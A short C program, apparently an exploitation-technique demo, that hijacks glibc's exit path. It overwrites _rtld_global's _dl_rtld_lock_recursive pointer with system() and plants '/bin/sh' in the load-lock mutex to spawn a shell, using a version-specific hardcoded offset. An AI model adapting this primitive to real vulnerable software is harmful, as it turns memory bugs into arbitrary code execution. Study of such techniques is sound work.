#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long _dl_rtld_lock_recursive;
 unsigned long long _dl_rtld_unlock_recursive;
 unsigned long long _dl_rtld_lock_recursive_addr;
 unsigned long long _dl_rtld_unlock_recursive_addr;
 char *system_ptr = (char *)&system;
 printf("system:%p\n",system_ptr);
 char *_rtld_global_addr = (char *)(system_ptr+0x36d668);
 char *_rtld_global=*(unsigned long long *)_rtld_global_addr;
 _dl_rtld_lock_recursive_addr = (_rtld_global + 0xf00);
 _dl_rtld_unlock_recursive_addr = (_rtld_global + 0xf08);  
 printf("%p _dl_rtld_lock_recursive_addr  vs %p _dl_rtld_unlock_recursive_addr\n",_dl_rtld_lock_recursive_addr,_dl_rtld_unlock_recursive_addr);
 _dl_rtld_lock_recursive = *(unsigned long long *)(_rtld_global + 0xf00);
 _dl_rtld_unlock_recursive = *(unsigned long long *)(_rtld_global + 0xf08);  
 char*_dl_load_lock_mutex=(_rtld_global+0x908);  
 printf("%p _dl_rtld_lock_recursive  vs %p _dl_rtld_unlock_recursive\n",_dl_rtld_lock_recursive,_dl_rtld_unlock_recursive);
 *(unsigned long long *)_dl_rtld_lock_recursive_addr=system_ptr; 
 //*(unsigned long long *)_dl_rtld_unlock_recursive_addr=system_ptr; 
 strncpy(_dl_load_lock_mutex,"/bin/sh\x00",8);

  return 0;
}